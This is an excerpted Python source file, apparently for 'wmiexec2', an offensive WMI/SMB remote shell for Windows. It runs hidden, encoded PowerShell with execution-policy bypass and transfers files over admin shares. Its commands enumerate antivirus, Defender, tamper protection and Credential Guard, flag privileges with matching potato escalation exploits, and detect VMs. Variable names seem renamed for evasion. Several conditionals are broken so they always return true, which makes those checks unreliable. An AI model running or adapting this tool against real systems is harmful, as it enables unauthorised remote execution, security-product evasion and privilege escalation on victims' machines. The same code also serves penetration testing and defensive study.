...
class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
        ...
        self.brinkles_share = share
        self.brinkles_output = '\\' + temp_perm("dir") + '\\' + OUTPUT_FILENAME
        print(f"[*] Output Filename: {self.brinkles_output}")
        self.brinkles_outputBuffer = str('')
        self.brinkles_shell = temp_perm("cmd") + ' /Q /c '
        self.brinkles_shell_type = shell_type
        ...
        # -Enc --> Encoded command
        self.brinkles_pwsh = temp_perm("power") + ' -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.brinkles_win32Process = win32Process
        self.brinkles_transferClient = smbConnection
        self.brinkles_silentCommand = silentCommand
        self.brinkles_pwd = str('C:\\')
        self.brinkles_noOutput = False
        self.intro = '[*] **Launching wmiexec2**\n[*] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.brinkles_transferClient is not None:
            self.brinkles_transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.brinkles_noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.brinkles_silentCommand is True:
            self.brinkles_shell = ''

    def format_print_buff(self):
        if len(self.brinkles_outputBuffer.strip('\r\n')) > 0:
            print(self.brinkles_outputBuffer)
            self.brinkles_outputBuffer = ''
  ...
  """)
        ...
        if save_local_option == "save":
            try:
                ...
                for item in config_file:
                    ...
                    time.sleep(1)
                    local_save_file.write(self.brinkles_outputBuffer.strip('\r\n') + '\n')
                    self.brinkles_outputBuffer = ''
    ...
    def do_mounts(self, s):
        try:
            ...
            if len(self.brinkles_outputBuffer.strip('\r\n')) > 0:
                new_buff = self.brinkles_outputBuffer.split("codec")[0]
                print(new_buff)
                self.brinkles_outputBuffer = ''
    ...
    def do_lget(self, src_path):
        ...
        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.brinkles_pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename, 'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.brinkles_transferClient.getFile(drive[:-1] + '$', tail, fh.write)
            fh.close()
    ...
    def do_lput(self, s):
        try:
            ...
            import ntpath
            pathname = ntpath.join(ntpath.join(self.brinkles_pwd, dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.brinkles_transferClient.putFile(drive[:-1] + '$', tail, fh.read)
            fh.close()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
    ...
    def do_av(self, s):
        try:
            ...
            for i in av_procs:
                if i in self.brinkles_outputBuffer.strip('\r\n'):
                    print(i)
            self.brinkles_outputBuffer = ''
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
    ...
    def do_defender(self, s):
        try:
            ...
            if "0x1" in self.brinkles_outputBuffer:
                logging.info('Defender Service is Running')
            elif "0x0" in self.brinkles_outputBuffer:
            ...
            if "0x0" in self.brinkles_outputBuffer:
                logging.info('Real Time Protection is Enabled')
            elif "0x1" in self.brinkles_outputBuffer:
            ...
            if "0x0" or "0x4" in self.brinkles_outputBuffer:
                logging.info('Tamper Protection is Disabled')
            elif "0x5" in self.brinkles_outputBuffer:
    ...
    def do_tokens(self, s):
        ...
        if len(self.brinkles_outputBuffer.strip('\r\n')) > 0:
            if "SeImpersonatePrivilege" in self.brinkles_outputBuffer:
                cprint('[*] SeImpersonate Enabled:', 'green')
                print('\tJuicy-Potato\n\tRougeWinRM\n\tSweetPotato\n\tPrintSpoofer')
            if "SeBackupPrivilege" in self.brinkles_outputBuffer:
            ...
            if "SeTakeOwnershipPrivilege" in self.brinkles_outputBuffer:
            ...
            if "SeDebugPrivilege" in self.brinkles_outputBuffer:
    ...
    def do_creds(self, s):
        ...
        if "0x0" in self.brinkles_outputBuffer or "0" in self.brinkles_outputBuffer or "ERROR" in self.brinkles_outputBuffer:
        ...
        if "0x1" in self.brinkles_outputBuffer or "1" in self.brinkles_outputBuffer:
        ...
        if "0x0" in self.brinkles_outputBuffer or "ERROR" in self.brinkles_outputBuffer:
            logging.info("Credential Guard Probably not enabled")
            self.brinkles_outputBuffer = ''
        elif "0x1" or "1" in self.brinkles_outputBuffer:
            logging.info("Credential Guard active with UEFI lock")
            self.brinkles_outputBuffer = ''
        elif "0x2" or "2" in self.brinkles_outputBuffer:
        ...
        if "10" in self.brinkles_outputBuffer:
    ...
    def do_vmcheck(self, s):
        try:
            ...
            if "File Not Found" in self.brinkles_outputBuffer.strip('\r\n'):
            ...
            if "VBoxMouse.sys" or "VBoxGuest.sys" in self.brinkles_outputBuffer:
                print("[!] Found VBox Files:")
                cprint(self.brinkles_outputBuffer, "red")
            else:
                print(self.brinkles_outputBuffer.strip('\r\n'))
            self.brinkles_outputBuffer = ''
    ...
    def do_cd(self, s):
        ...
        if len(self.brinkles_outputBuffer.strip('\r\n')) > 0:
            ...
            if PY2:
                self.brinkles_pwd = ntpath.normpath(ntpath.join(self.brinkles_pwd, s.decode(sys.stdin.encoding)))
            else:
                self.brinkles_pwd = ntpath.normpath(ntpath.join(self.brinkles_pwd, s))
            self.execute_remote('cd ')
            self.brinkles_pwd = self.brinkles_outputBuffer.strip('\r\n')
            self.prompt = (self.brinkles_pwd + '> ')
            if self.brinkles_shell_type == 'powershell':
    ...
    def get_output(self):
        def output_callback(data):
            try:
                self.brinkles_outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                self.brinkles_outputBuffer += data.decode(CODEC, errors='replace')

        if self.brinkles_noOutput is True:
            self.brinkles_outputBuffer = ''
            return

        while True:
            try:
                self.brinkles_transferClient.getFile(self.brinkles_share, self.brinkles_output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    ...
                    self.brinkles_transferClient.reconnect()
                    return self.get_output()
        self.brinkles_transferClient.deleteFile(self.brinkles_share, self.brinkles_output)

    def execute_remote(self, data, shell_type='cmd'):
        if shell_type == 'powershell':
            data = '$ProgressPreference="SilentlyContinue";' + data
            data = self.brinkles_pwsh + b64encode(data.encode('utf-16le')).decode()

        command = self.brinkles_shell + data

        if self.brinkles_noOutput is False:
            # can you obfuscate this...
            command += ' 1> ' + '\\\\localhost\\%s' % self.brinkles_share + self.brinkles_output + ' 2>&1'
        if PY2:
            self.brinkles_win32Process.Create(command.decode(sys.stdin.encoding), self.brinkles_pwd, None)
        else:
            self.brinkles_win32Process.Create(command, self.brinkles_pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.brinkles_shell_type)
        print(self.brinkles_outputBuffer)
        self.brinkles_outputBuffer = ''
